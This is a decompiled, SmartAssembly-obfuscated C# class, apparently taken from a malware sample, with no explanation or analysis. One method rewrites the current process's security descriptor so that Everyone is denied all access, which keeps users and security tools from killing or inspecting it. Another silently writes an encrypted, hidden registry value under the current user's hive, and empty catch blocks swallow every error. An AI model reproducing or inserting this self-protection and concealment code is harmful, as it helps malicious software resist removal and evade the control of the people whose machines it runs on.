using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace DFgOqDzZpZe;

internal sealed class rFZKrGPQZNF
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr KrwKWTRddQDfKP, int KLqRREQdMNmlHv, [Out] byte[] SzSXknDUmm, uint LACxGbCXSdOsPrG, out uint BmqsTYuoKHvOa);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr MXxOmUJtWcZgTZ, int SgABHZfAyGrHz, [In] byte[] duPkZDVKPEjtF);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void JklKvMEQvelA(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107402116)));
			registryKey.SetValue(thNrRmMEuvdxhHm.ZvzUuZdcuZvZyuA(getString_0(107402011)), getString_0(107404726));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor RHCEkiHPZA(IntPtr intptr_0)
	{
		byte[] szSXknDUmm = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, szSXknDUmm, 0u, out var BmqsTYuoKHvOa);
		if ((long)BmqsTYuoKHvOa > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, szSXknDUmm = new byte[BmqsTYuoKHvOa], BmqsTYuoKHvOa, out BmqsTYuoKHvOa))
		{
			return null;
		}
		return new RawSecurityDescriptor(szSXknDUmm, 0);
	}

	private void xDvgExPOjwc(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void WGVAzUNVXjV()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = RHCEkiHPZA(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			xDvgExPOjwc(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static rFZKrGPQZNF()
	{
		Strings.CreateGetStringDelegate(typeof(rFZKrGPQZNF));
	}
}
